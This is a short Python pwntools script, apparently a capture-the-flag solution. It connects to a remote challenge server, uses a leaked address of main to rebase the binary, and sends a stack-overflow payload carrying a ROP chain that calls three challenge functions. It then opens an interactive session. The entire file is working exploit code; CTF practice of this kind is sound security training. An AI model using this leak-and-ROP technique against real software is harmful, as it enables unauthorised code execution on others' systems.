import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context

pwnlib.context.context.clear(arch='amd64', os='linux')

# Connect to remote server and get the main address
r = pwnlib.tubes.remote.remote('ce441-pwn2.pwni.top', 1337)
first_line = r.recvline()
print(first_line)
main_address = int(str(first_line).split()[-1][:-3], base=16)
print("main address is", main_address)

# Reallocate
e = pwnlib.elf.ELF('pwn')
e.address += main_address - e.functions['main'].address
print("main address in elf is", e.functions['main'].address)

# Create ROP
rop = pwnlib.rop.rop.ROP(e)
rop.call('Hawiya')
rop.call('Jahim')
rop.call('loss', [0x1337c0de, 0xdeadc0de - 0x1337c0de])
print(rop.dump())

# Create the payload
payload = bytearray()
payload += ('a' * (0x20 + 8)).encode('ascii') # SUB RSP,0x20 + PUSH RBP, overflow the stack
payload += bytes(rop)
print("sending", payload)
r.sendline(payload)
# Sho khosh
r.interactive()